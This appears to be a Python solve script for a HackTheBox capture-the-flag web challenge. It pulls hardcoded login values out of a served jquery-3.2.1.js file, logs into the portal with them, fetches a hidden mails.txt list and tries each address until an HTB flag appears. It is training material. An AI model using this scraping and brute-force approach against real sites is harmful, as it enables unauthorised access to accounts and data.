#!/usr/local/bin/python3

import requests
import re

url = 'http://docker.hackthebox.eu:37100/'

s = requests.session()

# Get valid values
response = s.get(url + 'jquery-3.2.1.js')
content = response.text
values = re.findall('("value","\w+")', content)
name1 = re.findall('"value","(.*)"', values[0])[0]
name2 = re.findall('"value","(.*)"', values[1])[0]

# Enter in portal
s.post(url + 'main/index.php', data={'name1': name1, 'name2': name2})

# Get emails
response = s.get('http://docker.hackthebox.eu:37100/main/secret_area_/mails.txt')
mails = response.text
mails = mails.strip('All good boys are here... hehehehehehe!\n----------------------------------------')

# Try emails
url = 'http://docker.hackthebox.eu:37100/main/Diaxirisths.php'
mails = mails.split()
for email in mails:
    data = {'name1': email}
    response = s.post(url, data=data)
    if 'HTB' in response.text:
        flag = re.findall('HTB{(.*)}', response.text)[0]
        print('HTB{%s}' % flag)
        break
